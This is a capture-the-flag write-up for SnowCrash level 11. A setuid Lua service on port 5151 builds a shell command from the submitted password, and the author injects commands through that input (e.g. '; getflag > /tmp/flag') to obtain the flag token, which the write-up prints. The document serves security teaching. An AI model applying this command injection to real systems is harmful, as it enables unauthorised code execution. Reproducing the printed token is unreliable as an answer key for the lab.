# Level 11

- Once logged in, you will see a file `level11.lua`

```
???$ ssh level11@localhost -p 4242
	   _____                      _____               _
	  / ____|                    / ____|             | |
	 | (___  _ __   _____      _| |     _ __ __ _ ___| |__
	  \___ \| '_ \ / _ \ \ /\ / / |    | '__/ _` / __| '_ \
	  ____) | | | | (_) \ V  V /| |____| | | (_| \__ \ | | |
	 |_____/|_| |_|\___/ \_/\_/  \_____|_|  \__,_|___/_| |_|

  Good luck & Have fun

          localhost 10.110.0.2
level11@localhost's password:
level11@SnowCrash:~$ ls
level11.lua
level11@SnowCrash:~$ ls -ls
total 4
4 -rwsr-sr-x 1 flag11 level11 668 Mar  5  2016 level11.lua
```

[what is `lua` file?](https://en.wikipedia.org/wiki/Lua_(programming_language))
```
level11@SnowCrash:~$ file level11.lua
level11.lua: setuid setgid a lua script, ASCII text executable
```

let\`s run `lua`, and take a look at the script

```
level11@SnowCrash:~$ ./level11.lua
lua: ./level11.lua:3: address already in use
stack traceback:
	[C]: in function 'assert'
	./level11.lua:3: in main chunk
	[C]: ?
```

```
level11@SnowCrash:~$ cat level11.lua
#!/usr/bin/env lua
local socket = require("socket")
local server = assert(socket.bind("127.0.0.1", 5151))

function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")
  data = prog:read("*all")
  prog:close()

  data = string.sub(data, 1, 40)

  return data
end


while 1 do
  local client = server:accept()
  client:send("Password: ")
  client:settimeout(60)
  local l, err = client:receive()
  if not err then
      print("trying " .. l)
      local h = hash(l)

      if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
          client:send("Erf nope..\n");
      else
          client:send("Gz you dumb*\n")
      end

  end

  client:close()
end
```
there is something going on port `5151`
```
level11@SnowCrash:~$ nc -zv localhost 5151
Connection to localhost 5151 port [tcp/pcrd] succeeded!
```

as the script itself describes, there is a process running on `5151` port, and get input, compare the hash value, and determine whether the value is right or wrong.

but let's take a look the `function hash(pass)`

```
function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")
  data = prog:read("*all")
  prog:close()

  data = string.sub(data, 1, 40)

  return data
end
```
On second line, it executes `io.popen(...)` where a process is executed. and `..pass..` is the place where paramater is passed.

As long as the parameter is passed into the function, it will execute command.

Let's try out
```
level11@SnowCrash:~$ nc localhost 5151
Password: ; echo hello world > /tmp/flag11
Erf nope..
level11@SnowCrash:~$ cat /tmp/flag11
hello world
```

And how about...

```
level11@SnowCrash:~$ nc localhost 5151
Password: ; getflag > /tmp/flag
Erf nope..
```

```
level11@SnowCrash:~$ nc localhost 5151
Password: ; getflag > /tmp/flag
Erf nope..
level11@SnowCrash:~$ cat /tmp/flag
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
``
